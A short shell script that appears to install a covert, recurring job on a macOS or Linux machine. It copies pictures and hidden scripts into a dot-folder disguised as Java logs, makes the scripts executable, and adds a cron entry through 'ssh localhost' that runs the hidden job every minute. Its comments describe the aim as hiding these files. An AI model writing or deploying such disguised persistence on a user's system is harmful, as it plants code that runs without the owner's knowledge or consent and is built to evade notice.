
# check operative system
if [[ "$OSTYPE" == "darwin"* ]]; then
    OS="MAC"
elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
    OS=$(sh linux-environments.sh -n)
    # TODO: missing jobs for environments
fi

# set vars
ROOT_FOLDER=$HOME/.JAVA_LOGS_1805

# hide pictures
rm -rf $ROOT_FOLDER
cp -r pictures $ROOT_FOLDER

# hide job and randomizer
cp randomizer.sh $ROOT_FOLDER/.randomizer.sh
cp jobs/$OS.sh $ROOT_FOLDER/.job.sh

# give perms to job and randomizer
chmod +x $ROOT_FOLDER/.randomizer.sh
chmod +x $ROOT_FOLDER/.job.sh

# setup cronjob
ssh localhost "(crontab -l -u $USER 2>/dev/null; \
                echo '* * * * * ${ROOT_FOLDER}/.job.sh ${ROOT_FOLDER} > ${ROOT_FOLDER}/.logs 2>&1') \
                | crontab -"
